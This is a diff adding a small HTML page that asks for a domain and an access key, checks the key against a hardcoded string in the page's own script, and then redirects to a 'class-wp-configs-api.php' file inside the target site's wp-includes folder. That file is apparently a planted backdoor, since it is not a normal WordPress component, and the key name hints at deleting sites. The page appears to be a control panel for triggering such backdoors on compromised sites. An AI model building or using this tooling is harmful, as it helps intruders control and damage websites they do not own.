@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect to Config API</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
+
+    <div class="bg-gray-800 p-8 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-3xl font-bold text-center text-red-500 mb-6">Enter Domain</h1>
+        
+        <form id="redirectForm" class="flex flex-col space-y-4">
+            <label for="domain" class="text-lg">Domain Name:</label>
+            <input type="text" id="domain" name="domain" placeholder="example.com"
+                   class="p-3 rounded-lg text-gray-900 focus:outline-none focus:ring-2 focus:ring-red-500"
+                   required>
+
+            <label for="accessKey" class="text-lg">Access Key:</label>
+            <input type="password" id="accessKey" name="accessKey" placeholder="Enter your access key"
+                   class="p-3 rounded-lg text-gray-900 focus:outline-none focus:ring-2 focus:ring-red-500"
+                   required>
+
+            <button type="submit"
+                    class="bg-red-600 text-white font-bold py-3 px-6 rounded-lg hover:bg-red-700 transition duration-300">
+                Redirect
+            </button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('redirectForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            
+            const domain = document.getElementById('domain').value.trim();
+            const accessKey = document.getElementById('accessKey').value.trim();
+            const expectedKey = "duckistsitedelete"; // Replace this with your actual secret key
+
+            if (domain && accessKey === expectedKey) {
+                // Redirect to the specified URL with the entered domain if access key is correct
+                window.location.href = `https://${domain}/wp-includes/class-wp-configs-api.php?key=duckist`;
+            } else {
+                alert("Invalid access key. You are not authorized to access this page.");
+            }
+        });
+    </script>
+    
+</body>
+</html>
